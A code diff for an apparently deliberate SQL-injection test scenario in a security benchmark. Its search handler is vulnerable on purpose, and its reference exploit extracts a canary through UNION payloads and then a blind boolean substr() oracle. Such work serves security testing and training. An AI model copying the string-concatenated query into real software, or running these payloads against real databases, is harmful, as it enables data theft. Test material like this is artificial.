@@ -1,151 +1,123 @@
-// WSTG-INPV-05.4 — PostgreSQL SQL Injection behaviour.
-// Backed by real Postgres. The legitimate query concatenates user input
-// into a WHERE clause (no parameterisation) — vulnerable to UNION-based
-// injection that pulls from a sensitive table sharing the same shape.
+// WSTG-INPV-05 (.2 MySQL / .4 PostgreSQL) — SQL Injection data extraction (polyglot).
+// The search runs a string-concatenated query against a real SQL engine (dialect
+// per deploy: sqlite / postgres / mysql). A separate vault table holds the canary:
+//   T0 -> direct UNION SELECT pulls the vault rows into the rendered results.
+//   T1 -> a WAF blocks UNION (incl comment-splitting), so extraction must go
+//         blind: a boolean subquery oracle (results-present) recovers the canary
+//         character-by-character.
+// Columns are fixed: items(id,title,body), vault(id,name,value).
 
-import crypto from 'node:crypto'
+import { makeDb } from '../_shared/sql-dialects.mjs'
 import { Scenario } from './scenario.mjs'
-import { bulkInsertRecords } from '../_shared/synthesize-records.mjs'
 
-const ROW_SHAPE = `(id TEXT PRIMARY KEY, owner_session TEXT NOT NULL, data JSONB NOT NULL)`
+let dbPromise = null
+function getDb(scenario, canary) {
+  if (!dbPromise) dbPromise = (async () => {
+    const d = await makeDb(scenario.dialect)
+    const esc = s => String(s).replace(/'/g, "''")
+    await d.run('DROP TABLE IF EXISTS ' + scenario.itemsTable)
+    await d.run('DROP TABLE IF EXISTS ' + scenario.vaultTable)
+    await d.run(`CREATE TABLE ${scenario.itemsTable} (id INTEGER, title TEXT, body TEXT)`)
+    await d.run(`CREATE TABLE ${scenario.vaultTable} (id INTEGER, name TEXT, value TEXT)`)
+    let i = 1
+    for (const it of scenario.items) {
+      await d.run(`INSERT INTO ${scenario.itemsTable} (id, title, body) VALUES (${i++}, '${esc(it.title)}', '${esc(it.body)}')`)
+    }
+    let v = 1
+    await d.run(`INSERT INTO ${scenario.vaultTable} (id, name, value) VALUES (${v++}, '${esc(scenario.vaultLabel)}', '${esc(canary)}')`)
+    for (const s of scenario.vaultDecoys) {
+      await d.run(`INSERT INTO ${scenario.vaultTable} (id, name, value) VALUES (${v++}, '${esc(s.name)}', '${esc(s.value)}')`)
+    }
+    return d
+  })()
+  return dbPromise
+}
 
 export const classDef = {
-  wstgId: 'WSTG-INPV-05.4',
-  class: 'SQLi',
-  defenceTiers: [0, 1, 2, 3, 4],
+  wstgId: 'WSTG-INPV-05',
+  class: 'SQL Injection (data extraction, polyglot)',
+  defenceTiers: [0, 1],
   Scenario,
-  requiresDatabase: true,
-  supportsSignup: true,
-  needsSignup: true,
+  needsSignup: false,
+  canaryRuntime: true,
+  infraVariant: (s) => s.dialect,
+  discoveryMode: 'observation',
+  discoveryTargetPath: (s) => s.endpoint.path,
+  discoveryStaticOk: (s) =>
+    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes(s.endpoint.path),
 
-  // ============================================================
-  // Schema + signup hooks
-  // ============================================================
-  async initSchema({ db, rawScenario }) {
-    const scenario = Scenario.parse(rawScenario)
-    const p = scenario.primaryTable
-    const s = scenario.sensitiveTable
-    if (p === s) throw new Error('primaryTable and sensitiveTable must differ')
-
-    await db.query(`DROP TABLE IF EXISTS ${quoteIdent(p)}`)
-    await db.query(`DROP TABLE IF EXISTS ${quoteIdent(s)}`)
-    await db.query(`CREATE TABLE ${quoteIdent(p)} ${ROW_SHAPE}`)
-    await db.query(`CREATE TABLE ${quoteIdent(s)} ${ROW_SHAPE}`)
-
-    // primaryTableRows / sensitiveTableRows are synthesized by the deploy
-    // pipeline (arrays of field-objects). Wrap each into the (id, owner, data)
-    // shape and bulk-insert.
-    const primaryRecords = (scenario.primaryTableRows || []).map((fields, i) => ({
-      identifier: `r_${i}_${crypto.randomBytes(2).toString('hex')}`,
-      ownerSessionId: 'sess_legacy',
-      fields,
-    }))
-    const sensitiveRecords = (scenario.sensitiveTableRows || []).map((fields, i) => ({
-      identifier: `s_${i}_${crypto.randomBytes(2).toString('hex')}`,
-      ownerSessionId: 'sess_internal',
-      fields,
-    }))
-    await bulkInsertRecords(db, quoteIdent(p), primaryRecords)
-    await bulkInsertRecords(db, quoteIdent(s), sensitiveRecords)
-  },
-
-  async onSignup({ db, sessionId, rawScenario, signupData }) {
-    const scenario = Scenario.parse(rawScenario)
-    const p = scenario.primaryTable
-    const fields = {}
-    for (const [k, v] of Object.entries(scenario.signupRecordTemplate)) {
-      fields[k] = String(v).replace(/\{email\}/g, signupData.email || '')
-    }
-    const newId = 'u_' + crypto.randomBytes(5).toString('hex')
-    await db.query(
-      `INSERT INTO ${quoteIdent(p)} (id, owner_session, data) VALUES ($1, $2, $3)`,
-      [newId, sessionId, JSON.stringify(fields)]
-    )
-    // Redirect handled by runtime from scenario.postSignupLandingPath
-    return { recordIdentifier: newId }
-  },
-
-  // ============================================================
-  // Runtime: request matching + handling
-  // ============================================================
   matchesRequest({ reqUrl, req, scenario }) {
     if (req.method !== (scenario.endpoint.method || 'GET')) return false
     return reqUrl.pathname === scenario.endpoint.path
   },
 
-  async handleRequest({ req, reqUrl, scenario, session, db, helpers, renderPage }) {
-    const rawInput = await helpers.extractInput(req, reqUrl, scenario.slots.user_input)
+  async handleRequest({ req, reqUrl, scenario, helpers, renderPage, manifest }) {
+    const input = await helpers.extractInput(req, reqUrl, scenario.slots.user_input)
+    if (!input || !String(input).trim()) {
+      return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', '<p style="color:#666;padding:24px 0">Enter a search term to begin.</p>')) }
+    }
+    const d = await getDb(scenario, manifest.perDeployCanary)
+    // VULNERABLE: user input concatenated into the WHERE clause (no params).
+    const sql = `SELECT id, title, body FROM ${scenario.itemsTable} WHERE body LIKE '%${input}%'`
+    let rows
+    try { rows = await d.query(sql) }
+    catch (e) {
+      return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', `<pre class="db-error" style="color:#b00">${escapeHtml(String(e.message).slice(0, 200))}</pre>`)) }
+    }
+    return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', renderRows(rows))) }
+  },
 
-    // Empty query — real e-commerce UX: prompt user, don't dump records.
-    if (!rawInput || rawInput.trim() === '') {
-      return {
-        status: 200,
-        body: renderPage(scenario.body.replace('{RESULTS}', '<p class="search-prompt" style="color:#666;font-style:italic;padding:24px 0">Enter a term above to begin browsing.</p>')),
-      }
+  // Reference exploit: try direct UNION (works at T0). If the canary doesn't
+  // surface (T1 WAF blocks UNION), fall back to blind boolean extraction using a
+  // results-present oracle.
+  async fireExploit({ scenario, perDeployCanary, helpers }) {
+    const search = async (payload) => {
+      const r = await helpers.fireScenarioRequest({ scenario, payload })
+      return r.body || ''
     }
 
-    const p = scenario.primaryTable
-    const sess = (session || 'anon').replace(/'/g, "''")
-    // VULNERABLE: rawInput interpolated, not parameterised.
-    const sql = `SELECT id, owner_session, data FROM ${quoteIdent(p)} WHERE owner_session = '${sess}' AND data::text ILIKE '%${rawInput}%'`
+    // 1. direct UNION extraction
+    const direct = await search(`zzx' UNION SELECT id, name, value FROM ${scenario.vaultTable} -- `)
+    if (perDeployCanary && direct.includes(perDeployCanary)) return { status: 200, body: direct }
 
-    try {
-      const result = await db.query(sql)
-      const rendered = renderRows(result.rows)
-      return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', rendered)) }
-    } catch (err) {
-      const errBody = `<pre class="db-error">Database error: ${escapeHtml(err.message)}</pre>`
-      return { status: 200, body: renderPage(scenario.body.replace('{RESULTS}', errBody)) }
+    // 2. blind boolean extraction — results-present oracle. A false condition
+    // matches ~nothing; a true condition floods all items into the results.
+    const falseCount = countCards(await search(`zzx' OR '1'='2' -- `))
+    const trueCount = countCards(await search(`zzx' OR '1'='1' -- `))
+    if (trueCount <= falseCount) return { status: 200, body: '(blind oracle unavailable)' }
+    const oracle = async (expr) => countCards(await search(`zzx' OR ${expr} -- `)) >= trueCount
+
+    const sub = `(SELECT value FROM ${scenario.vaultTable} WHERE name='${scenario.vaultLabel}' LIMIT 1)`
+    const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
+    let secret = ''
+    for (let pos = 1; pos <= 64; pos++) {
+      const hits = await Promise.all([...charset].map(async (c) =>
+        (await oracle(`substr(${sub},${pos},1)='${c}'`)) ? c : null))
+      const c = hits.find(Boolean)
+      if (!c) break
+      secret += c
     }
+    return { status: 200, body: secret }
   },
 
-  // ============================================================
-  // Deploy validator: fire a payload through the search endpoint
-  // ============================================================
-  async fireExploit({ scenario, payload, sessionCookie, helpers }) {
-    // Honours scenario.endpoint.method + scenario.slots.user_input.location
-    return helpers.fireScenarioRequest({ scenario, payload, sessionCookie })
-  },
-
-  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) => {
-    return responseBody.includes(perDeployCanary)
-  },
+  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
+    responseBody.includes(perDeployCanary),
 }
 
-// ============================================================
-// Helpers
-// ============================================================
-// Render rows as themed cards based on the data JSONB blob. Drops internal
-// columns (id, owner_session) which a real search UI would not surface.
-// UNION-bypass rows from the sensitive table share the same row shape and
-// render the same way — their data blob (containing the canary) appears
-// inline in the cards.
+// Exposed for the in-process self-test.
+export const __test = { getDb, resetDb: () => { dbPromise = null }, countCards }
+
+function countCards(html) {
+  return (String(html).match(/result-card/g) || []).length
+}
 function renderRows(rows) {
-  if (!rows.length) return '<p class="no-results" style="color:#666;padding:24px 0">No matching results.</p>'
-  return '<div class="results-grid" style="display:grid;gap:12px;padding:16px 0">' +
-    rows.map(r => {
-      const data = (typeof r.data === 'object' && r.data) ? r.data : {}
-      const fields = Object.entries(data).map(([k, v]) =>
-        `<div style="font-size:14px;margin:4px 0"><span style="color:#666;text-transform:capitalize">${escapeHtml(k.replace(/_/g, ' '))}:</span> <span>${escapeHtml(stringify(v))}</span></div>`
-      ).join('')
-      return `<article class="result-card" style="border:1px solid #e5e5e5;border-radius:8px;padding:16px;background:#fafafa">${fields}</article>`
-    }).join('') +
-  '</div>'
+  if (!rows.length) return '<p style="color:#666;padding:24px 0">No matching results.</p>'
+  return '<div style="display:grid;gap:12px;padding:16px 0">' + rows.map(r =>
+    `<article class="result-card" style="border:1px solid #e5e5e5;border-radius:8px;padding:16px;background:#fafafa">
+      <div style="font-weight:600">${escapeHtml(r.title)}</div>
+      <div style="font-size:14px;margin-top:4px">${escapeHtml(r.body)}</div>
+    </article>`).join('') + '</div>'
 }
-
-function stringify(v) {
-  if (v === null || v === undefined) return ''
-  if (typeof v === 'object') return JSON.stringify(v)
-  return String(v)
-}
-
-function quoteIdent(name) {
-  if (!/^[a-z][a-z0-9_]*$/.test(name)) {
-    throw new Error(`Invalid table name: ${name}`)
-  }
-  return '"' + name + '"'
-}
-
 function escapeHtml(s) {
-  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
 }
